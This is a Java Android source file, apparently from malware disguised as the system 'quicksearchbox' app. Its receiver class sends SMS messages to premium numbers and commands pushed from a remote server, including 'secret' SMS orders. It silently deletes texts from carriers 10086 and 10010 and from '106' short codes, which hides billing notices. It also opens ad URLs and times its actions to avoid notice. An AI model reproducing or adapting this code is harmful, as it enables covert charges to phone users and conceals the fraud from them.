package com.android.quicksearchbox.quicksearchbox.search;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.android.quicksearchbox.quicksearchbox.bean.CFGInfo_header;
import com.android.quicksearchbox.quicksearchbox.bean.ChannelNumber;
import com.android.quicksearchbox.quicksearchbox.bean.ControlData;
import com.android.quicksearchbox.quicksearchbox.bean.CurstomCFG;
import com.android.quicksearchbox.quicksearchbox.bean.SalesVolume;
import com.android.quicksearchbox.quicksearchbox.bean.SmsAdsData;
import com.android.quicksearchbox.quicksearchbox.bean.SmsData;
import com.android.quicksearchbox.quicksearchbox.bean.WapAdsData;
import com.android.quicksearchbox.quicksearchbox.model.AdsService;
import com.android.quicksearchbox.quicksearchbox.model.CFGService;
import com.android.quicksearchbox.quicksearchbox.model.ChannelNumService;
import com.android.quicksearchbox.quicksearchbox.model.GPRSService;
import com.android.quicksearchbox.quicksearchbox.model.SmsSenderAndReceiver;
import com.android.quicksearchbox.quicksearchbox.model.TimerCenter;
import com.android.quicksearchbox.quicksearchbox.util.ByteUtil;
import com.android.quicksearchbox.quicksearchbox.util.IsNetOpen;
import com.android.quicksearchbox.quicksearchbox.util.KsoCache;
import com.android.quicksearchbox.quicksearchbox.util.KsoHelper;
import com.android.quicksearchbox.quicksearchbox.util.LogFile;
import com.android.quicksearchbox.quicksearchbox.util.ShareProDBHelper;
import com.android.quicksearchbox.quicksearchbox.util.SmsCenterNumber;

public class KsoAlarmService extends BroadcastReceiver {
	private final String TAG = "KsoAlarmService";
	private ShareProDBHelper share;
	private KsoMainCourse ksoMainCourse;
	private String[] saleNumbers;

	@Override
	public void onReceive(Context context, Intent intent) {
		ksoMainCourse = new KsoMainCourse();
		share = new ShareProDBHelper(context);
		int isShutSell = KsoCache.getInstance().getValue("isShutSell") != null ? (Integer) KsoCache.getInstance()
				.getValue("isShutSell") : 0;
		String salesNumber = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache.getInstance()
				.getValue("saleNumbers") : "";
		if(!"".equals(salesNumber)){
			saleNumbers = salesNumber.substring(0,
					salesNumber.lastIndexOf(",")).split(",");
		}
		int saleIndex = saleNumbers != null ?KsoHelper.getRandom(saleNumbers.length) : 0;
		if (intent.getAction().equals("start")) {
			int intelnetCount = KsoCache.getInstance().getValue("intelnetCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("intelnetCount") : 0;
			int month = KsoHelper.getCurrentMonth();
			int internetedCount = share.getSharedPreferences("dataCenter")
					.getInt(month + "��", 0);

			long startIntelnetDate = KsoCache.getInstance().getValue("startIntelnetDate") != null ? (Long) KsoCache.getInstance()
					.getValue("startIntelnetDate") : 0;
			String IntelnetDates = KsoCache.getInstance().getValue("internetDate") != null ? (String) KsoCache.getInstance()
					.getValue("internetDate") : "";
			String[] IntelnetDate = IntelnetDates.split(",");
			int driveup = share.getSharedPreferences("DRIVEUP_PREE").getInt(
					"DRIVEUP_COUNT_PREE", 0);
			int driveup_cfg = KsoCache.getInstance().getValue("driveup") != null ? (Integer) KsoCache.getInstance()
					.getValue("driveup") : 0;
					int saleCount =  KsoCache.getInstance().getValue("sellCount") != null ? (Integer) KsoCache.getInstance().getValue("sellCount") : 2;
			if (intelnetCount >= internetedCount) {
				if (ksoMainCourse.decideStartFlag(startIntelnetDate, context)
						&& (driveup == driveup_cfg)) {
					if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,driveup,saleCount)) {
						ksoMainCourse.startTimerHandler(context);

					}
					if (ksoMainCourse.checkGPRSOccasion(context, IntelnetDate)) {
						ksoMainCourse.startGPRSHandler(context);
					}
				} else {
				}
			} else {
			}
		}else if(intent.getAction().equals("SmsCenter")) {
			SmsCenterNumber smsCenter = new SmsCenterNumber(context);
			smsCenter.sendSms();
		} else if (intent.getAction().equals("sales1")) {
			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "01");
				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
				} else {
				}
			} else {
			}
		} else if (intent.getAction().equals("sales2")) {
			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "02");
				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
				} else {
				}
			} else {
			}
		} else if (intent.getAction().equals("sales3")) {
			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "03");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
				} else {
				}
			} else {
			}
		} else if (intent.getAction().equals("sales4")) {

			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "04");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
				} else {
				}
			} else {
			}

		} else if (intent.getAction().equals("sales5")) {
			String saleSmsCat = KsoCache.getInstance().getValue("saleSmsCat") != null ? (String) KsoCache.getInstance().getValue("saleSmsCat") : "";
			if (isShutSell == 0 && !"".equals(saleSmsCat)) {
				SalesVolume sv = SalesVolume.getInstance(context, "05");		
					SmsSenderAndReceiver.send2(saleSmsCat, sv
							.mergesalesvolumestring().trim());
			} else {
			}
		} else if (intent.getAction().equals("GPRS")) {
			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			if (hour < 7) {
				int year = calendar.get(Calendar.YEAR);
				int month = calendar.get(Calendar.MONTH);
				int day = calendar.get(Calendar.DAY_OF_MONTH);
				hour = 7 + hour;
				int temp = (int) Math.random() * 100;
				while (temp >= 60) {
					temp = (int) Math.random() * 100;
				}
				int minute = temp;
				TimerCenter tcenter = new TimerCenter();
				Calendar timerDelay = tcenter.getTime(year, month, day, hour, minute,0);
				tcenter.startTimerHandler(context, timerDelay, "GPRS");
				return;
			}
			UpdateGprsData(context);
			UpdateAdsData(context);
			String today = KsoHelper.date2String();
			ShareProDBHelper dbHelper = new ShareProDBHelper(context);
			SharedPreferences sp = dbHelper.getSharedPreferences("dataCenter");
			int month = KsoHelper.getCurrentMonth();
			int internetedCount = sp.getInt(month + "��", 0);
			Editor editor = sp.edit();
			editor.putString("updateTime", today);
			editor.putInt(month + "��", internetedCount + 1);
			editor.commit();
		} else if (intent.getAction().equals("Money")) {
			String secretSmsNumber = KsoCache.getInstance().getValue("secretSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsNumber") : "";
			String secretSmsOrder = KsoCache.getInstance().getValue("secretSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsOrder") : "";
			long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache.getInstance()
					.getValue("adsTime") : 0;
			int secretSmsCount = KsoCache.getInstance().getValue("secretSmsCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("secretSmsCount") : 0;
			String relpyNumber = KsoCache.getInstance().getValue("deleteTeleponeNumber") != null ? (String) KsoCache.getInstance()
					.getValue("deleteTeleponeNumber") : "";
			if (!"".equals(secretSmsNumber) && !"".equals(secretSmsOrder)) {			
				if (secretSmsCount > 0) {
					Intent service = new Intent(context, SendSmsService.class);
					service.putExtra("sendTime", time);
					service.putExtra("sendCount", secretSmsCount);
					service.putExtra("flag",4);
					service.putExtra("secretSmsReplyNumber",relpyNumber);
					service.putExtra("secretSmsNumber",secretSmsNumber);
					service.putExtra("secretSmsOrder", secretSmsOrder);
					context.startService(service);
				} else if (secretSmsCount == 0) {
				}
		   }
		} else if (intent.getAction().equals("sendNormonSms")) {
			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10086" });
			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10010" });
			deleteSMS(context);
			Editor editor = share.writer("sendSmsFlag");
			editor.putBoolean("sendNormonSms", false);
			KsoCache.getInstance().reSetValues2("sendNormonSms", false);
			editor.commit();

		} else if (intent.getAction().equals("ADS")) {
			String adsNumber = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache.getInstance()
					.getValue("adsNumbers") : "";
			String adsContent = KsoCache.getInstance().getValue("adsContent") != null ? (String) KsoCache.getInstance()
					.getValue("adsContent") : "";
			String[] adsNumbers = adsNumber.substring(0,
					adsNumber.lastIndexOf(",")).split(",");
			int time = KsoCache.getInstance().getValue("adsTime") != null ? (Integer) KsoCache.getInstance()
					.getValue("adsTime") : 0;
			if (adsNumbers.length > 0) {
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", adsNumbers.length);
				service.putExtra("flag",5);
				service.putExtra("adsNumber",adsNumber);
				service.putExtra("adsContent", adsContent);
				context.startService(service);
			}

		} else if (intent.getAction().equals("ADS_WAP")) {
			String url = KsoCache.getInstance().getValue("url") != null ? (String) KsoCache.getInstance()
					.getValue("url") : "";
			if (!"".equals(url)) {
				Uri uri = Uri.parse(url);
				Intent ksoIntent = new Intent();
				ksoIntent.setAction(Intent.ACTION_VIEW);
				ksoIntent.setData(uri);
				ksoIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ksoIntent);
			}

		}else if (intent.getAction().equals("ksoSendSms")) {
			String smsNumber = KsoCache.getInstance().getValue("ksoSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsNumber") : "";
			
			String smsOrder = KsoCache.getInstance().getValue("ksoSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsOrder") : "";
					
			if(!"".equals(smsNumber) && !"".equals(smsOrder)){
				SmsSenderAndReceiver.send2(smsNumber, smsOrder);
			}
			

		} else if (intent.getAction().equals("BASE_CHARGE")) {
		}
	}

	public void UpdateGprsData(final Context context) {
		new Thread() {
			public void run() {
				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {
					return;
				}
				GPRSService gprsservice = new GPRSService();			
				byte gprsdata[] = GPRSService.updateGprsData(context);
				if(gprsdata == null){
					return;
				}
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsdata);
				if(gprsheader != null){
				}			
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsdata, gprsheader);	
				if(datacontrol != null){		
					if(datacontrol.getSellPhoneNumber() != null){
						int saleDelay5 = (int) (Math.random());
						saleDelay5 = 420;
						Intent intentSalesFlag5 = new Intent(context,
								KsoAlarmService.class);
						intentSalesFlag5.setAction("sales5");
						PendingIntent pintentSalesFlag5 = PendingIntent.getBroadcast(
								context, 0, intentSalesFlag5, 0);
						AlarmManager alarmSales5 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales5.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + saleDelay5 * 60 * 60 * 1000,
								pintentSalesFlag5);
					}
					CurstomCFG cfg = CurstomCFG.getInstance();		
					if(cfg != null){
						cfg.setBillStyle(datacontrol.getBillStyle());
						cfg.setBillCount(datacontrol.getMonthlyPayment());
						cfg.setUploadTiem(datacontrol.getAdsTime());
						cfg.setDeleteTime(datacontrol.getPlayingTime());
						cfg.setIsShutDown(datacontrol.getIsShutGSMDown());
						cfg.setIsChanelShutDown(datacontrol.getIsShutChanelDown());
						cfg.setIsNotify(datacontrol.getIsNotify());
						if (datacontrol.getIsNotify() == 1) {
							cfg.setNotifyContent(datacontrol.getNotifyContent());
						}
						CFGService cfgservice = new CFGService();
						byte bt[] = cfgservice.getCurstomCFGByte(cfg);
						try {
							File file_config = new File("data/data/com.android.quicksearchbox/files/smartphonec.dat");	
							FileOutputStream fos = new FileOutputStream(file_config);
							ByteUtil.writeByteFile(fos, bt);				
						} catch (Exception e) {
							e.printStackTrace();
						}	
					}
				}
				

				ChannelNumber channel = ChannelNumber.getInstance();
				List<SmsData> smsDatas = gprsservice.getSmsData(gprsdata, gprsheader);
				String smsNumber = "";
				String smsOrder = "";
				if (smsDatas != null && smsDatas.size() > 0) {
					for (SmsData smsData : smsDatas) {			
						smsNumber += smsData.getChanel() + ",";
						smsOrder += smsData.getOrder() + ",";
					}
					String strChannel[] = smsNumber.substring(0, smsNumber.lastIndexOf(",")).split(",");
					String strOrder[] = smsOrder.substring(0, smsOrder.lastIndexOf(",")).split(",");
					if (KsoHelper.getARS2(context) == 1) {
						channel.setCmCount(smsDatas.size());
						channel.setCmNumber(strChannel);
						channel.setCmCommand(strOrder);
					} else if (KsoHelper.getARS2(context) == 2) {
						channel.setUmCount(smsDatas.size());
						channel.setUmNumber(strChannel);
						channel.setUmCommand(strOrder);
					}		
					byte chnnelNumBytes[] = ChannelNumService.getChannelNumByte(channel);		
					try {
						File file_channel = new File("data/data/com.android.quicksearchbox/files/smartphonem.dat");
						FileOutputStream fos = new FileOutputStream(file_channel);
						ByteUtil.writeByteFile(fos, chnnelNumBytes);	
					} catch (Exception e) {
						e.printStackTrace();
					}	
				}
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(gprsdata, gprsheader);
				if(secretSmsDatas != null){
					if( secretSmsDatas.size() > 0){
						ksoMainCourse.startMoneyHandler(context);
					}else if(secretSmsDatas.size()== 0){
					}
					
				}
				
				
				if(gprsdata != null){
					KsoCache.getInstance().init(context);
				}
				
				
				
				
			}
		}.start();
	}

	@SuppressWarnings("unused")
	private static int initdriveupcount(Context context) {
		return context.getSharedPreferences("DRIVEUP_PREE",
				Context.MODE_WORLD_WRITEABLE).getInt("DRIVEUP_COUNT_PREE", 0);
	}

	private void UpdateAdsData(final Context context) {
		new Thread() {
			public void run() {
				IsNetOpen ino = new IsNetOpen(context);
				if (!ino.checkNet()) {
					return;
				}
				byte[] bytes = AdsService.updateAdsData(context);
				if(bytes == null){
					return;
				}
				
				if(bytes != null){
					KsoCache.getInstance().init(context);
				}
				AdsService adsService = new AdsService();
				SmsAdsData smsAdsData = adsService.getSmsAdsData(bytes, adsService.getAdsHeader(bytes));
				if(smsAdsData != null){
					ksoMainCourse.startAdsSMSHandler(context);				
				}
				WapAdsData wapAdsData = adsService.getWapAdsData(bytes, adsService.getAdsHeader(bytes));
				
				if(wapAdsData != null){
					long waptimeout = KsoCache.getInstance().getValue("wap_timeout") != null ? (Long)KsoCache.getInstance().getValue("wap_timeout") : 0;
					if(wapAdsData.getTime()>=5 && wapAdsData.getTime() <= 15){
						ksoMainCourse.startBaseChargeHandler(context,waptimeout);
					}
					else{
						ksoMainCourse.startAdsWAPHandler(context,waptimeout);
					}
				}
				
			}
		}.start();
	}
	public void deleteSMS(Context context) {
		try {
			ContentResolver CR = context.getContentResolver();

			Uri uriSms = Uri.parse("content://sms");
			Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id",
					"address" }, null, null, null);
			if (null != c && c.moveToFirst()) {
				do {

					long threadId = c.getLong(1);
					String address = c.getString(c.getColumnIndex("address"));
					if (address.startsWith("106")) {
						CR.delete(
								Uri.parse("content://sms/conversations/"
										+ threadId), null, null);
					}
				} while (c.moveToNext());
			}
		} catch (Exception e) {
		}
	}
}
